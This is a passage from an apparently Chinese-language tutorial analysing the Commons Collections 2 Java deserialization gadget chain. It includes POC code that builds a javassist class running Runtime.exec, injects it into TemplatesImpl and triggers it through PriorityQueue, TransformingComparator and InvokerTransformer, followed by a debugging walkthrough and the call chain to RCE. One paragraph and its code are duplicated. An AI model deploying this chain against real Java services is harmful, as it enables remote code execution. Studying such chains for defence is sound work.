            queue.add(1);//添加数字1插入此优先级队列
            queue.add(1);//添加数字1插入此优先级队列
            Field field2=queue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段
            field2.setAccessible(true);//暴力反射
            field2.set(queue,comparator);//设置queue的comparator字段值为comparator
            Field field3=queue.getClass().getDeclaredField("queue");//获取queue的queue字段
            field3.setAccessible(true);//暴力反射
            field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
            outputStream.writeObject(queue);
            outputStream.close();
            ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
            inputStream.readObject();
        }
    }
先来看第一段代码：
            ClassPool classPool=ClassPool.getDefault();//返回默认的类池
            classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
            CtClass payload=classPool.makeClass("CommonsCollections22222222222");//创建一个新的public类
            payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
            payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
我在这里划分了几个部分，这一段代码的意思可以简单理解为一句话，创建动态一个类，设置父类添加命令执行内容。
这里首先抛出一个疑问，上面的代码在前面，添加了`AbstractTranslet`所在的搜索路径，将`AbstractTranslet`设置为使用动态新建类的父类，那么这里为什么需要设置AbstractTranslet为新建类的父类呢？这里先不做解答，后面分析poc的时候再去讲。
     Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
            Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段
            field.setAccessible(true);//暴力反射
            field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组
            Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段
            field1.setAccessible(true);//暴力反射
            field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test
第二部分代码，反射获取`_bytecodes`的值，设置为转换后的`payload`的字节码。`_name`也是一样的方式设置为test。
那么为什么需要这样设置呢？为什么需要设置`_bytecodes`的值为`paylaod`的字节码?这是抛出的第二个疑问。
这里先来为第二个疑问做一个解答。
来看看`TemplatesImpl`的`_bytecodes`被调用的地方
经过了`load.defineclass`方法返回了_class。在getTransletInstance()方法里面调用了__class.newInstance()方法。也就是说对我们传入的payload进行了实例化。这就是为什么使用的是`templatesImpl`类而不是其他类来构造的原因。
而且看到他这里是强转为`AbstractTranslet`类类型。这也是第一个疑问中为什么要继承`AbstractTranslet`为父类的原因。
那么就需要去寻找调用`getTransletInstance`的地方。在`templatesImpl`的`newTransformer`方法中其实会调用到`getTransletInstance`方法。
这时候就要考虑到了`newTransformer`怎么去调用了，POC中给出的解决方案是使用`InvokerTransformer`的反射去调用。
    InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
    TransformingComparator comparator =new TransformingComparator(transformer);
这又使用到了`TransformingComparator`是为什么呢？其实在前置知识的地方说过。`TransformingComparator`的`compare`方法会去调用传入参数的`transform`方法。
而关于`compare`的办法就需要用到`PriorityQueue`来实现了。
查看对应的POC代码
    PriorityQueue queue = new PriorityQueue(2);
            queue.add(1);
            queue.add(1);
            Field field2=queue.getClass().getDeclaredField("comparator");
            field2.setAccessible(true);
            field2.set(queue,comparator);
`siftDownUsingComparator`方法会调用到`comparator`的`compare`。
`siftDownUsingComparator`会在`siftDown`方法进行调用
`siftDown`会在`heapify`调用，而`heapify`会在`readobject`复写点被调用。
下面再来看POC中的最后一段代码
    Field field3=queue.getClass().getDeclaredField("queue");
    field3.setAccessible(true);
    field3.set(queue,new Object[]{templatesImpl,templatesImpl});
设置queue.queue为Object[]数组，内容为两个内置恶意代码的`TemplatesImpl`实例实例化对象。这样调用`heapify`方法里面的时候就会进行传参进去。
到这里POC为何如此构造已经是比较清楚了，但是对于完整的一个链完整的执行流程却不是很清楚。有必要调试一遍。刚刚的分析其实也是逆向的去分析。
## 0x03 POC调试
在`readobject`位置打个断点，就可以看到反序列化时，调用的是`PriorityQueue`的`readobject`,而这个`readobject`方法会去调用`heapify`方法。
`heapify`会调用`siftDown`方法，并且传入`queue`，这里的`queue`是刚刚传入的构造好恶意代码的`TemplatesImpl`实例化对象。
该方法判断`comparator`不为空，就会去调用`siftDownUsingComparator`,这的`comparator`是被`TransformingComparator`修饰过的`InvokerTransformer`实例化对象。
跟进到`siftDownUsingComparator`方法里面，发现会方法会去调用`comparator`的`compare`,因为我们这里的`compare`是被`TransformingComparator`修饰过的`InvokerTransformer`实例化对象。所以这里调用的就是`TransformingComparator`的`compare`。
在这里传入的2个参数，内容为`TemplatesImpl`实例化对象。
跟进到方法里面，`this.iMethodName`内容为`newTransformer`反射调用了`newTransformer`方法。再跟进一下。
`newTransformer`会调用`getTransletInstance`方法。
再跟进一下`getTransletInstance`方法，这里会发现先判断是否为空，为空的话调用`defineTransletClasses()`进行赋值，这里是将`_bytecodes`赋值给`_class`。
`defineTransletClasses()`执行完后会跳回刚刚的地方，留意第一个if判断语句如果`_name`等于null就直接返回null，不执行下面代码。这也是前面为什么会为`_name`设置值的原因。
再来看他的下一段代码
会`_class.newInstance()`对`_class`进行实例化。执行完这一步后就会弹出一个计算器。
###  调用链
    ObjectInputStream.readObject()->PriorityQueue.readObject()
    ->PriorityQueue.heapify
    ->PriorityQueue.siftDown->PriorityQueue.siftDownUsingComparator
    ->TransformingComparator.compare()
    ->InvokerTransformer.transform()->TemplatesImpl.getTransletInstance
    ->(动态创建的类)cc2.newInstance()->RCE
在最后面问题又来了，为什么`newInstance()`实例化了一个对象就会执行命令呢？
其实这就涉及到了在 `javassist`是怎么去构造的对象。
    ClassPool classPool=ClassPool.getDefault();
    classPool.appendClassPath(AbstractTranslet);
    CtClass payload=classPool.makeClass("CommonsCollections22222222222");
    payload.setSuperclass(classPool.get(AbstractTranslet));  payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); 
    payload.writeFile("./");
在最后面问题又来了，为什么`newInstance()`实例化了一个对象就会执行命令呢？
其实这就涉及到了在 `javassist`是怎么去构造的对象。
    ClassPool classPool=ClassPool.getDefault();
    classPool.appendClassPath(AbstractTranslet);
    CtClass payload=classPool.makeClass("CommonsCollections22222222222");
    payload.setSuperclass(classPool.get(AbstractTranslet));  payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); 
    payload.writeFile("./");
将这个类给写出来，再来查看一下具体的是怎么构造的。
看到代码后其实就已经很清楚了，`Runtime`执行命令代码是在静态代码块里面，静态代码块会在new对象的时候去执行。
## 0x04 结尾
其实个人觉得在分析利用链的时候，只是用别人写好的POC代码看他的调用步骤的话，意义并不大。分析利用链需要思考利用链的POC为什么要这样写。这也是我一直在文中一直抛出疑问的原因，这些疑问都是我一开始考虑到的东西，需要多思考。